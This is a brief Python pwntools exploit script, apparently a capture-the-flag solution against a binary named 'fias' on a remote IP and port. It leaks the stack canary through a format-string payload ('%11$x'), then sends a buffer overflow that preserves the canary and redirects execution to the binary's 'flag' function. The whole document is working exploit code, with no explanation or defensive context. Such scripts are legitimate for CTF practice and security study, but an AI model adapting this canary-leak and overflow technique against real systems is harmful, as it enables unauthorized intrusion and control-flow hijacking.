from pwn import *

r=remote("95.216.233.106",45107)
#r=process("./fias")
b=ELF("./fias")

pay1='%11$x'

context.log_level='debug'
r.sendafter("name? ",pay1+'\n')
r.recvuntil('you, ')

canary=int(r.recv(8).replace("!\n",''),16)
log.info(hex(canary))
pay2=""
pay2='x'*(0x25-0xc)
pay2+=p32(canary)
pay2+='x'*12
pay2+=p32(b.symbols['flag'])

r.sendline(pay2)

r.interactive()

